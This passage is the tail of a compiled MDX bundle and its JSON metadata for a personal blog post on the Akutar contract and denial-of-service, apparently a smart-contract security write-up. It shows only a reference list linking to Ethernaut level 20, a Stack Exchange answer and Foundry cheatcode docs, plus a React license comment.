0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:729,columnNumber:4},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:729,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://ethernaut.openzeppelin.com/level/20\",children:\"Ethernaut level 20\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:730,columnNumber:4},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:730,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://ethereum.stackexchange.com/a/113362\",children:\"Level 20 is no lonnger solvable by assert(false)\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:731,columnNumber:4},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:731,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://book.getfoundry.sh/cheatcodes/\",children:\"Foundry cheatcodes reference\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:732,columnNumber:4},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:732,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:727,columnNumber:1},this)]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:1,columnNumber:1},this)}function xn(c={}){let{wrapper:n}=c.components||{};return n?(0,t.jsxDEV)(n,Object.assign({},c,{children:(0,t.jsxDEV)(Te,c,void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\"},this)}),void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\"},this):Te(c)}var gn=xn;function Nn(c,n,b){throw new Error(\"Expected \"+(n?\"component\":\"object\")+\" `\"+c+\"` to be defined: you likely forgot to import, pass, or provide it.\"+(b?\"\\nIt\\u2019s referenced in your code at `\"+b+\"` in `/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx`\":\"\"))}return pn(yn);})();\n/*! Bundled license information:\n\nreact/cjs/react-jsx-dev-runtime.development.js:\n  (**\n   * @license React\n   * react-jsx-dev-runtime.development.js\n   *\n   * Copyright (c) Facebook, Inc. and its affiliates.\n   *\n   * This source code is licensed under the MIT license found in the\n   * LICENSE file in the root directory of this source tree.\n   *)\n*/\n;return Component;"
  },
  "_id": "blog/smart_contract/akutar_and_DDoS.mdx",
  "_raw": {
    "sourceFilePath": "blog/smart_contract/akutar_and_DDoS.mdx",
    "sourceFileName": "akutar_and_DDoS.mdx",
    "sourceFileDir": "blog/smart_contract",
    "contentType": "mdx",
    "flattenedPath": "blog/smart_contract/akutar_and_DDoS"
  },
  "type": "BlogPost",
  "slug": "smart_contract/akutar_and_DDoS"
}